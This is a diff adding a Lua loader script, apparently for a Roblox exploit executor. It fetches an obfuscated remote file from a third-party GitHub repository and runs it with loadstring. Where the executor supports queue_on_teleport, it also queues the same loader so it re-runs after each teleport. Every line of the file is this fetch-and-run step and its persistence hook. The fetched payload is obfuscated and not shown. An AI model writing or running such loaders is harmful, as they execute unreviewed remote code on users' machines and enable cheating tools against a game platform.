@@ -1,0 +1,17 @@
+local AutoLoad =
+'loadstring(game:HttpGet("https://raw.githubusercontent.com/sanford288/ZETTOMAISSZE-HUB/main/obfuscated.lua.txt"))()'
+
+pcall(function()
+
+	if queue_on_teleport then
+		
+		queue_on_teleport(AutoLoad)
+
+	elseif queueonteleport then
+		
+		queueonteleport(AutoLoad)
+
+	end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sanford288/ZETTOMAISSZE-HUB/main/obfuscated.lua.txt"))()
